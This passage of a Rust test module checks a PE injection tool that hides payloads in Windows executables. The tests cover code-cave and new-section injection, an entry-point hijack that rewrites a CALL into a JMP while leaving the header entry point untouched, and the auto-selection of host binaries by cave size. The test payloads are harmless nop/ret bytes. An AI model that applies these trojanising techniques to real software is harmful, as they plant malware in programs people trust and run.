            0x48, 0x83, 0xC4, 0x28,                     // add rsp, 0x28
            0xC3,                                       // ret
        ];

        let pe = build_test_pe64_with_cave(0x200, 0x600, &ep_code);
        let site = find_hijack_site(&pe, 0x1000, 256);

        assert!(site.is_some(), "Should find CALL instruction for hijack");
        let site = site.unwrap();
        assert_eq!(site.rva, 0x1004, "Hijack should target the CALL at EP+4");
        assert_eq!(site.instruction_len, 5);
    }

    #[test]
    fn test_ep_hijack_skips_first_instruction() {
        // EP starts with a CALL (first instruction) — should be skipped
        #[rustfmt::skip]
        let ep_code: Vec<u8> = vec![
            0xE8, 0x10, 0x00, 0x00, 0x00,               // call +0x10 (first instruction, SKIPPED)
            0x90,                                       // nop
            0xC3,                                       // ret
        ];

        let pe = build_test_pe64_with_cave(0x200, 0x600, &ep_code);
        let site = find_hijack_site(&pe, 0x1000, 256);

        assert!(
            site.is_none(),
            "Should skip first instruction even if it's CALL"
        );
    }

    #[test]
    fn test_ep_hijack_ret_only_fallback() {
        // EP is just `ret` — no suitable hijack instruction
        let ep_code: Vec<u8> = vec![0xC3];

        let pe = build_test_pe64_with_cave(0x200, 0x600, &ep_code);
        let site = find_hijack_site(&pe, 0x1000, 256);

        assert!(site.is_none(), "Single RET should not be hijackable");
    }

    #[test]
    fn test_ep_hijack_preserves_header_ep() {
        let tmp = TempDir::new().unwrap();

        #[rustfmt::skip]
        let ep_code: Vec<u8> = vec![
            0x48, 0x83, 0xEC, 0x28,                     // sub rsp, 0x28
            0xE8, 0x10, 0x00, 0x00, 0x00,               // call +0x10
            0x48, 0x83, 0xC4, 0x28,                     // add rsp, 0x28
            0xC3,                                       // ret
        ];

        let pe = build_test_pe64_with_cave(0x200, 0x600, &ep_code);
        let target_path = tmp.path().join("target.exe");
        std::fs::write(&target_path, &pe).unwrap();

        let config = PeInjectConfig {
            target_pe_path: Some(target_path),
            injectables_dir: None,
            output_dir: tmp.path().join("output"),
        };
        let injector = PeInjector::new(config).unwrap();

        let input = PeInjectInput {
            payload: vec![0x90, 0xC3],
            encoding: EncodingType::None,
            binary_mutations: vec![],
            return_to_oep: false,
            injection_mode: InjectionMode::CodeCave,
            redirect_mode: RedirectMode::EpHijack,
        };

        let artifact = injector.inject(&input).unwrap();
        assert_eq!(artifact.redirect_mode_used, RedirectMode::EpHijack);

        // AddressOfEntryPoint should remain 0x1000 (unchanged)
        let output_bytes = std::fs::read(&artifact.output_path).unwrap();
        let opt_off = optional_header_offset(&output_bytes);
        let ep = read_u32(&output_bytes, opt_off + 0x10);
        assert_eq!(ep, 0x1000, "EP header should be unchanged after hijack");
    }

    #[test]
    fn test_ep_hijack_jmp_displacement_correct() {
        #[rustfmt::skip]
        let ep_code: Vec<u8> = vec![
            0x48, 0x83, 0xEC, 0x28,                     // sub rsp, 0x28
            0xE8, 0x10, 0x00, 0x00, 0x00,               // call +0x10 (will be hijacked)
            0x48, 0x83, 0xC4, 0x28,                     // add rsp, 0x28
            0xC3,                                       // ret
        ];

        let pe = build_test_pe64_with_cave(0x200, 0x600, &ep_code);
        let site = find_hijack_site(&pe, 0x1000, 256).unwrap();

        let target_rva: u32 = 0x1300; // Simulated carrier RVA
        let mut pe_mut = pe;
        apply_ep_hijack(&mut pe_mut, &site, target_rva);

        // Verify the patched instruction is JMP rel32
        let patched_bytes = &pe_mut[site.file_offset..site.file_offset + 5];
        assert_eq!(patched_bytes[0], 0xE9, "Opcode should be JMP rel32");

        // Decode with iced-x86 and verify target
        let patched_slice = &pe_mut[site.file_offset..site.file_offset + site.instruction_len];
        let mut decoder =
            Decoder::with_ip(64, patched_slice, site.rva as u64, DecoderOptions::NONE);
        let instr = decoder.decode();
        assert!(!instr.is_invalid(), "Patched JMP should be valid x64");
        assert_eq!(
            instr.near_branch_target() as u32,
            target_rva,
            "JMP target should be {:#x}",
            target_rva
        );
    }

    // =========================================================================
    // Target Scanning & Selection Tests
    // =========================================================================

    #[test]
    fn test_scan_target_valid_pe() {
        let tmp = TempDir::new().unwrap();
        let pe = build_test_pe64_with_cave(0x200, 0x600, &[0xC3]);
        let path = tmp.path().join("test.exe");
        std::fs::write(&path, &pe).unwrap();

        let info = scan_target(&path);
        assert!(info.valid);
        assert!(info.error.is_none());
        assert_eq!(info.num_sections, 1);
        assert!(info.largest_cave_bytes > 0);
        assert_eq!(info.largest_cave_section.as_deref(), Some(".text"));
        assert_eq!(info.file_size, pe.len() as u64);
    }

    #[test]
    fn test_scan_target_invalid_file() {
        let tmp = TempDir::new().unwrap();
        let path = tmp.path().join("not_a_pe.exe");
        std::fs::write(&path, b"this is not a PE file").unwrap();

        let info = scan_target(&path);
        assert!(!info.valid);
        assert!(info.error.is_some());
        assert_eq!(info.largest_cave_bytes, 0);
    }

    #[test]
    fn test_scan_target_nonexistent_file() {
        let info = scan_target(Path::new("/nonexistent/file.exe"));
        assert!(!info.valid);
        assert!(info.error.is_some());
    }

    #[test]
    fn test_scan_injectables_dir_sorts_by_cave_size() {
        let tmp = TempDir::new().unwrap();

        // PE with small cave
        let small = build_test_pe64_with_cave(0x200, 0x400, &[0xC3]);
        std::fs::write(tmp.path().join("small.exe"), &small).unwrap();

        // PE with large cave
        let large = build_test_pe64_with_cave(0x200, 0x800, &[0xC3]);
        std::fs::write(tmp.path().join("large.exe"), &large).unwrap();

        // Non-exe file should be ignored
        std::fs::write(tmp.path().join("readme.txt"), "hello").unwrap();

        let targets = scan_injectables_dir(tmp.path()).unwrap();
        assert_eq!(targets.len(), 2);
        // Sorted descending by cave size — large should be first
        assert!(targets[0].largest_cave_bytes >= targets[1].largest_cave_bytes);
        assert!(targets[0].path.file_name().unwrap().to_str().unwrap() == "large.exe");
    }

    #[test]
    fn test_select_best_target_cave_mode() {
        let tmp = TempDir::new().unwrap();

        let small = build_test_pe64_with_cave(0x200, 0x400, &[0xC3]);
        std::fs::write(tmp.path().join("small.exe"), &small).unwrap();

        let large = build_test_pe64_with_cave(0x200, 0x800, &[0xC3]);
        std::fs::write(tmp.path().join("large.exe"), &large).unwrap();

        let targets = scan_injectables_dir(tmp.path()).unwrap();
        let best = select_best_target(
            &targets,
            32,
            EncodingType::None,
            InjectionMode::CodeCave,
            RedirectMode::HeaderPatch,
        );
        assert!(best.is_some());
        assert_eq!(
            best.unwrap().path.file_name().unwrap().to_str().unwrap(),
            "large.exe"
        );
    }

    #[test]
    fn test_select_best_target_no_suitable() {
        let tmp = TempDir::new().unwrap();

        // Tiny cave
        let pe = build_test_pe64();
        std::fs::write(tmp.path().join("tiny.exe"), &pe).unwrap();

        let targets = scan_injectables_dir(tmp.path()).unwrap();
        // Request huge payload in cave mode — should return None
        let best = select_best_target(
            &targets,
            100_000,
            EncodingType::None,
            InjectionMode::CodeCave,
            RedirectMode::HeaderPatch,
        );
        assert!(best.is_none());
    }

    #[test]
    fn test_select_best_target_new_section_accepts_any() {
        let tmp = TempDir::new().unwrap();

        let pe = build_test_pe64();
        std::fs::write(tmp.path().join("any.exe"), &pe).unwrap();

        let targets = scan_injectables_dir(tmp.path()).unwrap();
        // NewSection mode should accept any valid PE
        let best = select_best_target(
            &targets,
            100_000,
            EncodingType::None,
            InjectionMode::NewSection,
            RedirectMode::HeaderPatch,
        );
        assert!(best.is_some());
    }

    #[test]
    fn test_inject_with_auto_select() {
        let tmp = TempDir::new().unwrap();
        let injectables = tmp.path().join("injectables");
        std::fs::create_dir_all(&injectables).unwrap();

        let pe = build_test_pe64();
        std::fs::write(injectables.join("host.exe"), &pe).unwrap();

        let config = PeInjectConfig {
            target_pe_path: None,
            injectables_dir: Some(injectables),
            output_dir: tmp.path().join("output"),
        };
        let injector = PeInjector::new(config).unwrap();

        let input = PeInjectInput {
            payload: vec![0x90, 0xC3],
            encoding: EncodingType::None,
            binary_mutations: vec![],
            return_to_oep: false,
            injection_mode: InjectionMode::NewSection,
            redirect_mode: RedirectMode::HeaderPatch,
        };

        let artifact = injector.inject(&input).unwrap();
        assert!(artifact.output_path.exists());
        assert_eq!(artifact.target_pe_name, "host.exe");
    }
}
